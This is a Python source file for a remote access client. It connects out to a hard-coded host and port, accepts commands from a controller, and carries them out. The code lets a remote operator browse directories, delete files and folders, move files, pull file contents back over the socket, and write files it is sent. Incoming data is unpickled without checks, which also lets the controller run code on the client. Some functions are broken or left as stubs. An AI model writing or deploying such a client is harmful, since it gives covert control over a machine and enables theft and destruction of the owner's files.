import socket
import pickle
import time
import os
import shutil
import threading

class App():
    def __init__(self):
        self.hostname = "192.168.1.19"
        self.port = 5203
        self.status = "IDLE"
        self.cmd = CMD()
        self.data_ = None
        self.commands = {
            "cd" : self.cmd.cd,
            "cwd" : self.cmd.cwd,
            "ls" : self.cmd.ls,
            "mkdir" : self.cmd.mkdir,
            "remove" : self.cmd.remove,
            "removedir" : self.cmd.removedir,
            "getfile" : self.cmd.getfile,
            "sendfile" : self.cmd.sendfile,
            "zip_" : self.cmd.zip_,
            "unzip" : self.cmd.unzip,
            "move" : self.cmd.move,
            "copy" : self.cmd.copy,
            "copyfile" : self.cmd.copyfile(),
            "screenshot" : self.cmd.screenshot,
            "close" : self.cmd.close,
            "help" : self.cmd.help_,
            }

    def run(self):
        print("client online")
        while self.status != "CLOSED":
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.hostname, self.port))
                self.socket.sendall(self.status.encode())
                data = self.socket.recv(1024).decode()

                if data == "PINGED":
                    self.status = "PINGED"
                    print("client pinged")
                if data == "SELECTED":
                    self.status = "SELECTED"
                    print("client selected")
                    while self.status != "CLOSED":
                        try:
                            header = self.socket.recv(4096).decode().split(":")
                            type_, size, name = header[0], int(header[1]), header[2]
                            
                            bytes_data = b""
                            while len(bytes_data) < size:
                                packet = self.socket.recv(4096)
                                if not packet:
                                    break
                                bytes_data += packet
                            data = pickle.loads(bytes_data)
                            
                            #do things
                            header, data = self.gamberge(type_, name, data)
                            
                            data = pickle.dumps(data)
                            header = header.split(":")
                            header = f"{header[0]}:{len(data)}:{header[1]}"
                            
                            self.socket.send(header.encode()) #send header
                            time.sleep(0.05)
                            self.socket.sendall(data) #send data
                            
                        except Exception as e:
                            print(1, e)

                self.socket.close()

            except Exception as e:
                print(0, e)

    def gamberge(self, type_, name, data_in):
        header = "NONE:NONE"
        data = None
        
        if type(data_in) == type((0, 1)):
            self.data_ = data_in[1]
            data_in = data_in[0]
        
        if type_ == "COMMAND":
            try:
                command = data_in.split(" ")[0]
                args = data_in.split(" ")[1:len(data_in.split(" "))]
                
                if command in list(self.commands.keys()):
                    self.cmd.args = args
                    self.cmd.type = "TEXT"
                    data, name = self.commands[command]()
                    header = f"{self.cmd.type}:{name}"
                else:
                    data = "COMMAND_NOT_VALID"
                    header = "TEXT:NONE"
            except Exception as e:
                print(2, e)
        else:
            data = "TYPE_NOT_VALID"
        
        return header, data
    
class CMD():
    def __init__(self):
        self.args = []
        self.type = "TEXT"
        
    def cd(self):
        os.chdir(self.args[0])
        return "Done", "CHANGE_DIR"
    def cwd(self):
        return os.getcwd(), "GET_CURRENT_DIR"
    def ls(self):
        return os.listdir(os.getcwd()), "LIST_DIR"
    def mkdir(self):
        os.mkdir(self.args[0])
        return "Done", "CREATE_DIR"
    def remove(self):
        path = os.path.join(os.getcwd(), self.args[0])
        os.remove(path)
        return "Done", "REMOVE_FILE"
    def removedir(self):
        path = os.path.join(os.getcwd(), self.args[0])
        shutil.rmtree(path)
        return "Done", "REMOVE_DIR"
    def getfile(self):
        with open(self.args[0], "rb") as f:
            data = f.read()
        self.type = "FILE"
        return data, self.args[0]
    def sendfile(self):
        with open(f"{os.getcwd()}\{self.args[0]}", "wb") as f:
            f.write(app.data_)
        return "Done", "SEND_FILE"
    def zip_(self):
        shutil.make_archive(self.args[0], os.getcwd())
        return "Done", "ZIP"
    def unzip(self):
        #shutil.unpack_archive(self.args[0], )
        return "Done", "UNZIP"
    def move(self):
        shutil.move(self.args[0], self.args[1])
        return "Done", "MOVE"
    def copy(self):
        pass
    def copyfile(self):
        pass
    def screenshot(self):
        pass
    def close(self):
        app.status = "CLOSED"
        return "Done", "CLOSE"
    def help_(self):
        pass
        
if __name__ == "__main__":
    app = App()
    app.run()